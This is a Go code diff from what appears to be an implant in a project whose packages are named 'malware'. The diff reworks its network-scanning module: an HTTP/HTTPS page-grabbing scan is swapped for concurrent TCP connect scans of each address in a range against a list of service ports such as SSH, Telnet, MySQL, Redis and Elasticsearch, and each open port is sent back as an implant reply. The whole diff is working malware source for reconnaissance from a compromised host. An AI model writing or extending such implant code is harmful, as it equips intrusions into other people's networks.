@@ -4,12 +4,10 @@ import (
 	"context"
 	"fmt"
 	"golang.org/x/sync/semaphore"
-	"io/ioutil"
 	"malware/common/messages"
 	"malware/common/types"
 	"math"
 	"net"
-	"net/http"
 	"strconv"
 	"strings"
 	"sync"
@@ -32,23 +30,20 @@ func Create() types.Module {
 	return settings{&state}
 }
 
-func Scan(target string, timeout time.Duration) string {
-	resp, err := http.Get(target)
+func ScanPort(ip string, port int, timeout time.Duration) bool {
+	target := fmt.Sprintf("%s:%d", ip, port)
+	conn, err := net.DialTimeout("tcp", target, timeout)
 
 	if err != nil {
 		if strings.Contains(err.Error(), "too many open files") {
 			time.Sleep(timeout)
-			return Scan(target, timeout)
+			return ScanPort(ip, port, timeout)
 		}
-		return ""
+		return false
 	}
 
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		return ""
-	}
-	fmt.Printf("%s: %+v -> %s\n", target, resp.TLS, string(body))
-	return string(body)
+	conn.Close()
+	return true
 }
 
 // Call from 24 -> 32
@@ -76,13 +71,14 @@ func ip_range(ip string) (string, int) {
 	return ip_parts[0] + "." + ip_parts[1] + "." + ip_parts[2] + ".", int(math.Pow(float64(2), float64(32-bits)))
 }
 
+var ports = []int{22, 23, 25, 53, 80, 443, 514, 5431, 3306, 6379, 9200, 9300, 8080, 8000}
+
 func (settings settings) ip_scan(ipscan *messages.IPScan, callback func(*messages.ImplantReply)) {
 	if ipscan.Cancel {
 		settings.state.scanning = false
 	} else if settings.state.scanning {
 		callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_IPSCAN_RUNNING})
 	} else {
-		settings.state.scanning = true
 
 		wg := sync.WaitGroup{}
 		ip, bits := ip_range(ipscan.IpRange)
@@ -91,6 +87,7 @@ func (settings settings) ip_scan(ipscan *messages.IPScan, callback func(*message
 			return
 		}
 
+		settings.state.scanning = true
 		for start := 0; start < bits; start++ {
 			ip := ip + strconv.Itoa(start)
 			settings.state.lock.Acquire(context.TODO(), 1)
@@ -99,8 +96,13 @@ func (settings settings) ip_scan(ipscan *messages.IPScan, callback func(*message
 			go func(ip string) {
 				defer settings.state.lock.Release(1)
 				defer wg.Done()
-				Scan("http://"+ip, time.Second/4)
-				Scan("https://"+ip, time.Second/4)
+				for _, port := range ports {
+					if ScanPort(ip, port, time.Second/4) {
+						ipscan_reply := &messages.IPScanReply{Status: messages.IPScanReply_IN_PROGRESS, Ip: ip, Port: int32(port)}
+						callback(&messages.ImplantReply{Module: settings.ID(), Ipscan: ipscan_reply})
+					}
+				}
+
 			}(ip)
 		}
 
